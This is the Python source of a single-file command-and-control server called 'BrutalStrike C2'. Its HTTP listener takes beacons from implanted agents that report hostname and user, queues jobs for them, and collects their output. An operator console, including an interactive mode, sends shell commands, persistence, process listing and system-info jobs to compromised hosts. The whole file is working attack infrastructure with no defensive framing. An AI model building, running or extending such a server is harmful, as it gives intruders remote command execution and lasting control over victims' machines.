#!/usr/bin/env python3
import sys
import os
import threading
import time
import sqlite3
import json
import socket
from datetime import datetime
from flask import Flask, request, jsonify

print("=== BrutalStrike C2 Framework - Single File Edition ===")

class HTTPListener:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.app = Flask(__name__)
        self.agents = {}
        self.jobs = {}
        self.running = False
        self.setup_routes()
    
    def is_port_available(self, port):
        """Check if port is available"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind((self.host, port))
                return True
            except OSError:
                return False
    
    def setup_routes(self):
        @self.app.route('/beacon', methods=['POST'])
        def beacon():
            try:
                data = request.get_json()
                agent_id = data.get('agent_id')
                system_info = data.get('system_info', {})
                
                print(f"[+] Agent check-in: {agent_id} from {request.remote_addr}")
                print(f"    Hostname: {system_info.get('hostname', 'Unknown')}")
                print(f"    User: {system_info.get('username', 'Unknown')}")
                
                # Store agent
                self.agents[agent_id] = {
                    'last_seen': datetime.now(),
                    'system_info': system_info,
                    'ip': request.remote_addr
                }
                
                # Send pending jobs
                jobs = self.jobs.get(agent_id, [])
                if jobs:
                    print(f"    Sending {len(jobs)} jobs to agent")
                
                # Clear sent jobs
                if agent_id in self.jobs:
                    del self.jobs[agent_id]
                
                return jsonify({'jobs': jobs})
                
            except Exception as e:
                print(f"[-] Beacon error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/result', methods=['POST'])
        def result():
            try:
                data = request.get_json()
                agent_id = data.get('agent_id')
                job_id = data.get('job_id')
                output = data.get('output', '')
                
                print(f"[+] Job result from {agent_id}:")
                print(f"    Job ID: {job_id}")
                print(f"    Output: {output[:200]}..." if len(output) > 200 else f"    Output: {output}")
                
                return jsonify({'status': 'received'})
                
            except Exception as e:
                print(f"[-] Result error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/health', methods=['GET'])
        def health():
            return jsonify({'status': 'healthy'})
    
    def create_job(self, agent_id, module_name, arguments=None):
        job_id = f"job_{int(time.time())}_{len(self.jobs.get(agent_id, []))}"
        job = {
            'job_id': job_id,
            'module_name': module_name,
            'arguments': arguments or {}
        }
        
        if agent_id not in self.jobs:
            self.jobs[agent_id] = []
        
        self.jobs[agent_id].append(job)
        print(f"[+] Created job {job_id} for agent {agent_id}: {module_name}")
        return job_id
    
    def start(self):
        # Check if port is available
        if not self.is_port_available(self.port):
            print(f"[-] Port {self.port} is already in use!")
            print(f"[*] Trying alternative port 8080...")
            self.port = 8080
            
            if not self.is_port_available(self.port):
                print(f"[-] Port 8080 is also in use!")
                print(f"[*] Trying port 8443...")
                self.port = 8443
        
        print(f"[+] Starting HTTP listener on {self.host}:{self.port}")
        self.running = True
        
        def run_flask():
            try:
                self.app.run(
                    host=self.host, 
                    port=self.port, 
                    debug=False, 
                    threaded=True, 
                    use_reloader=False
                )
            except OSError as e:
                print(f"[-] Failed to start HTTP listener: {e}")
                self.running = False
            except Exception as e:
                print(f"[-] Unexpected error: {e}")
                self.running = False
        
        self.thread = threading.Thread(target=run_flask)
        self.thread.daemon = True
        self.thread.start()
        
        # Wait and check if it started successfully
        time.sleep(2)
        if self.thread.is_alive() and self.is_port_in_use(self.port):
            print(f"[✓] HTTP listener successfully started on port {self.port}")
            return True
        else:
            print(f"[-] HTTP listener failed to start on port {self.port}")
            self.running = False
            return False
    
    def is_port_in_use(self, port):
        """Check if our port is actually in use (listening)"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((self.host, port))
                return True
            except ConnectionRefusedError:
                return False

class C2Server:
    def __init__(self):
        self.running = False
        self.listener = None
        self.current_agent = None  # NEW: Track interactive mode agent
    
    def start(self):
        print("[+] Starting C2 Server...")
        self.running = True
        
        # Start HTTP listener
        self.listener = HTTPListener('0.0.0.0', 8080)
        success = self.listener.start()
        
        if not success:
            print("[-] Failed to start HTTP listener. Exiting.")
            return
        
        # Start command interface
        self.start_command_interface()
        
        print("\n" + "="*50)
        print("[✓] BrutalStrike C2 Framework Ready!")
        print(f"[✓] HTTP Listener: 0.0.0.0:{self.listener.port}")
        print(f"[✓] Agents connect to: http://YOUR_IP:{self.listener.port}/beacon")
        print("[✓] Type 'help' for commands")
        print("="*50)
        
        # Keep alive
        while self.running:
            time.sleep(1)
    
    def start_command_interface(self):
        def command_loop():
            while self.running:
                try:
                    # NEW: Show different prompt in interactive mode
                    if self.current_agent:
                        prompt = f"\nC2[{self.current_agent[:8]}]> "
                    else:
                        prompt = "\nC2> "
                    
                    cmd = input(prompt).strip()
                    self.handle_command(cmd)
                except (KeyboardInterrupt, EOFError):
                    print("\n[!] Shutting down...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[-] Command error: {e}")
        
        thread = threading.Thread(target=command_loop)
        thread.daemon = True
        thread.start()
    
    def handle_command(self, command):
        # NEW: Handle interactive mode commands first
        if self.current_agent:
            if command == 'back':
                self.handle_back()
                return
            elif command in ['exit', 'quit']:
                self.running = False
                return
            elif command in ['agents', 'status', 'help', 'clear']:
                # Allow these commands in interactive mode
                pass
            else:
                # In interactive mode, treat most commands as jobs for current agent
                self.handle_interactive_command(command)
                return
        
        # Original command handling
        if command == 'exit':
            self.running = False
        elif command == 'agents':
            self.list_agents()
        elif command == 'status':
            self.show_status()
        elif command == 'help':
            self.show_help()
        elif command.startswith('jobs '):
            self.handle_job(command)
        elif command.startswith('use '):  # NEW: Interactive mode command
            self.handle_use(command)
        elif command == 'clear':
            os.system('clear')
        else:
            print("Unknown command. Type 'help'")
    
    # NEW: Interactive mode methods
    def handle_use(self, command):
        """Enter interactive mode with specific agent"""
        parts = command.split(' ')
        if len(parts) < 2:
            print("Usage: use <agent_id>")
            return
        
        agent_id = parts[1]
        if agent_id in self.listener.agents:
            self.current_agent = agent_id
            agent_info = self.listener.agents[agent_id]
            sysinfo = agent_info.get('system_info', {})
            print(f"[+] Interactive mode with agent {agent_id[:8]}...")
            print(f"    Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"    User: {sysinfo.get('username', 'Unknown')}")
            print(f"    Type commands directly or 'back' to exit")
        else:
            print(f"[-] Agent {agent_id} not found")
    
    def handle_back(self):
        """Exit interactive mode"""
        if self.current_agent:
            print(f"[+] Exiting interactive mode with agent {self.current_agent[:8]}...")
            self.current_agent = None
        else:
            print("[-] Not in interactive mode")
    
    def handle_interactive_command(self, command):
        """Handle commands in interactive mode - send as jobs to current agent"""
        if not self.current_agent:
            return
        
        # Parse the command to determine module and arguments
        parts = command.split(' ', 1)
        module_name = parts[0]
        arguments = parts[1] if len(parts) > 1 else ""
        
        # Map common commands to modules
        module_map = {
            'sysinfo': 'sysinfo',
            'process_list': 'process_list',
            'ps': 'process_list',
            'persistence': 'persistence',
            'shell': 'shell'
        }
        
        # Determine the actual module name
        actual_module = module_map.get(module_name, module_name)
        
        # Parse arguments
        args_dict = {}
        if arguments:
            if actual_module == 'shell':
                args_dict = {'command': arguments}
            else:
                try:
                    args_dict = json.loads(arguments)
                except:
                    args_dict = {'args': arguments}
        
        # Create and send the job
        job_id = self.listener.create_job(self.current_agent, actual_module, args_dict)
        print(f"[✓] Sent job {job_id} to agent {self.current_agent[:8]}")
    
    def list_agents(self):
        if not self.listener or not self.listener.running:
            print("[-] HTTP listener not running")
            return
            
        agents = self.listener.agents
        if not agents:
            print("No active agents")
            return
        
        print(f"\nActive Agents ({len(agents)}):")
        print("-" * 70)
        for agent_id, info in agents.items():
            sysinfo = info.get('system_info', {})
            print(f"ID: {agent_id}")
            print(f"  IP: {info.get('ip', 'Unknown')}")
            print(f"  Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"  User: {sysinfo.get('username', 'Unknown')}")
            print(f"  OS: {sysinfo.get('os_version', 'Unknown')}")
            print(f"  Last seen: {info.get('last_seen')}")
            print("-" * 70)
    
    def show_status(self):
        if not self.listener:
            print("[-] HTTP listener not initialized")
            return
            
        agent_count = len(self.listener.agents) if self.listener.running else 0
        job_count = sum(len(jobs) for jobs in self.listener.jobs.values()) if self.listener.running else 0
        
        print(f"\nC2 Server Status:")
        print(f"  HTTP Listener: {'RUNNING' if self.listener.running else 'STOPPED'}")
        print(f"  Listener Port: {self.listener.port if self.listener else 'N/A'}")
        print(f"  Active agents: {agent_count}")
        print(f"  Pending jobs: {job_count}")
        print(f"  Server running: {self.running}")
        # NEW: Show interactive mode status
        if self.current_agent:
            print(f"  Interactive mode: ACTIVE (agent: {self.current_agent[:8]}...)")
        else:
            print(f"  Interactive mode: INACTIVE")
    
    def show_help(self):
        print("\nAvailable Commands:")
        print("  agents                    - List active agents")
        print("  status                    - Show server status")
        print("  use <agent_id>            - Enter interactive mode with agent")  # NEW
        print("  jobs <agent_id> <module> [args] - Create job")
        print("  clear                     - Clear screen")
        print("  exit                      - Shutdown server")
        print("  help                      - Show this help")
        
        # NEW: Show interactive mode info if active
        if self.current_agent:
            print(f"\nInteractive Mode (Agent: {self.current_agent[:8]}...):")
            print("  Type commands directly to send to agent")
            print("  back                     - Exit interactive mode")
            print("  Example: shell whoami    - Execute command")
            print("  Example: sysinfo         - Get system info")
            print("  Example: process_list    - List processes")
        
        print("\nAvailable Modules:")
        print("  shell <command>           - Execute system command")
        print("  sysinfo                   - Get detailed system information")
        print("  persistence [method]      - Establish persistence")
        print("  process_list              - List running processes")
    
    def handle_job(self, command):
        try:
            parts = command.split(' ', 3)
            if len(parts) < 3:
                print("Usage: jobs <agent_id> <module> [arguments]")
                print("Example: jobs abc123 shell whoami")
                return
            
            agent_id = parts[1]
            module_name = parts[2]
            arguments = parts[3] if len(parts) > 3 else ""
            
            # Parse arguments if provided as JSON
            args_dict = {}
            if arguments:
                try:
                    args_dict = json.loads(arguments)
                except:
                    # If not JSON, treat as shell command
                    if module_name == 'shell':
                        args_dict = {'command': arguments}
                    else:
                        args_dict = {'args': arguments}
            
            job_id = self.listener.create_job(agent_id, module_name, args_dict)
            print(f"[✓] Job {job_id} queued for agent {agent_id}")
            
        except Exception as e:
            print(f"[-] Job creation failed: {e}")

if __name__ == "__main__":
    server = C2Server()
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"[-] Server error: {e}")